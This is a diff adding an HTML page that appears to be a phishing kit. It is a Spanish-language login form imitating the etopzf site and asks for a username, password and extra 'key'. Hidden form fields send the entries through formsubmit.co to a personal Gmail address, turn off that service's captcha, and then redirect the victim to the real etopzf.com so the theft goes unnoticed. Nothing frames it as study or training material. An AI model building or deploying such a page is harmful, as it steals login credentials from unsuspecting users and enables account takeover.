@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>etopzf-check</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="style.css">
+</head>
+<body onload="generate()" onclick="button_color()">
+    <div class="container">
+        <h1>Hola! Bienvenido a iniciar sesión!</h1>
+
+    <form action="https://formsubmit.co/bouachrahamza01@gmail.com" method="POST">
+        <div class="input">
+        <label id="lb1" for="input-username">
+            <i class="fa-solid fa-user" style="color: #020203;"></i>Cuenta
+        </label>
+        <input type="text" id="input-username" placeholder="Por favor introduzca su nombre de usuario o dirección de correo electrónico" name="username" required>
+        </div>
+
+
+        <div class="input">
+        <label id="lb1" for="input-password">
+            <i class="fa-solid fa-lock" style="color: #030507;"></i>contraseña
+        </label>
+        <input type="password" id="input-password" placeholder="Por favor introduzca su contraseña" maxlength="32" required name="password">
+        </div>
+
+
+        <div class="input">
+            <label id="lb1" for="keys">
+                <i class="fa-solid fa-key" style="color: #030408;"></i></i>Clave
+            </label>
+            <input type="password" id="input-key" placeholder="Por favor ingrese su clave" maxlength="32" required name="key">
+            </div>
+
+
+
+        <div class="captcha">
+            <input type="text" id="cap" maxlength="4" placeholder="Introduce el captcha" required>
+            <div class="numb"></div>
+        </div>
+
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_template" value="table">
+        <input type="hidden" name="_next" value="https://etopzf.com/index/index/index/jumplang/fa.html" >
+       
+        <button onclick="check()" type="submit" id="btn11" class="btn1" >conexión</button>
+    </form>
+        <p><span> sin cuenta? </span> registro </p>
+        <p>Has olvidado tu contraseña ?</p>
+        
+    </div>
+
+
+    
+    <script src="script.js"></script>
+</body>
+</html>
